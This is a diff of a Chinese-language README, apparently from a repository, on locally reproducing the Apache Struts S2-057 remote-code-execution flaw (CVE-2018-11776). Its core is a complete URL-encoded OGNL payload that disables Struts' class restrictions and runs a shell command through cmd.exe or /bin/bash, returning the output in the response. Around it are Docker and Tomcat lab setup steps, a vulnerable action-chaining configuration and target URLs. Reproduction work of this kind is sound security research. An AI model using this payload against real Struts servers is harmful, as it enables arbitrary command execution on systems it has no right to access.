@@ -1,8 +1,10 @@
 # S2-057本地测试与复现
 
+FN@悬镜安全实验室
+
 ## POC
 
-测试发现结合S2-045构造的POC堪称完美，当然是根据各位大佬的poc自行测试构造的，适用于Struts 2.3.34，而Struts 2.5.16的poc还没测试成功，等大佬们的poc吧
+测试发现结合S2-045构造的POC堪称完美，linux和windows通用，应该可执行任意命令，返回格式舒服且无乱码，当然是根据各位大佬的poc自行测试构造的，适用于Struts 2.3.34，而Struts 2.5.16的poc还没测试成功，等大佬们的poc吧
 
 ```
 $%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
@@ -55,7 +57,7 @@ tomcat+war即可
             </result>
 		</action>
 		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
-			<result type="chain">actionChain3</result>
+			<result type="chain">xxx</result>
 		</action>
 		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
 			<result type="postback">
@@ -100,10 +102,10 @@ docker内执行：
 
 ```
 cd /usr/local/tomcat/webapps
-cp vul.xml S2-057-2-3-34/WEB-INF/classes/struts-actionchaining.xml
-#cp vul.xml S2-057-2-3-34/WEB-INF/src/java/struts-actionchaining.xml
-cp vul.xml S2-057-2-5-16/WEB-INF/classes/struts-actionchaining.xml
-#cp vul.xml S2-057-2-5-16/WEB-INF/src/java/struts-actionchaining.xml
+cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/classes/struts-actionchaining.xml
+#cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/src/java/struts-actionchaining.xml
+cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/classes/struts-actionchaining.xml
+#cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/src/java/struts-actionchaining.xml
 cd /usr/local/tomcat/bin
 ./shutdown.sh
 ```
@@ -129,11 +131,13 @@ docker rmi image_id
 
 ## 漏洞复现
 
+只提供了windows下的部分截图，linux也复现成功了的，不过未再提供截图
+
 1.Redirect action
 
 http://HOST/S2-057-2-3-34/POC/actionChain1.action
 
-验证在返回头Location里，回显在body里
+表达式验证在返回头Location里，poc命令执行回显在body里
 
 ![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Redirect-dir.jpg)
 
@@ -141,7 +145,7 @@ http://HOST/S2-057-2-3-34/POC/actionChain1.action
 
 http://HOST/S2-057-2-3-34/POC/actionChain2.action
 
-无回显，无跳转，命令执行成功，回显在body里
+无回显，无跳转，应该是xml中该action配置的原因，命令执行成功，回显在body里
 
 ![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Chain-dir.jpg)
 
@@ -163,7 +167,11 @@ http://HOST/S2-057-2-3-34/POC/actionChain3.action
 
 https://github.com/jas502n/St2-057
 
+https://lgtm.com/blog/apache_struts_CVE-2018-11776
+
 ## TODO
 
 1. Struts 2.5.16 poc
-2. 通用检测脚本，发现有的脚本只检测了Redirect action的情况，看大佬们的介绍应该还存在其他情况
+2. 其他版本测试
+3. 通用检测脚本，发现有的脚本只检测了Redirect action的情况，看大佬们的介绍应该还存在其他情况
+4. 实际测试
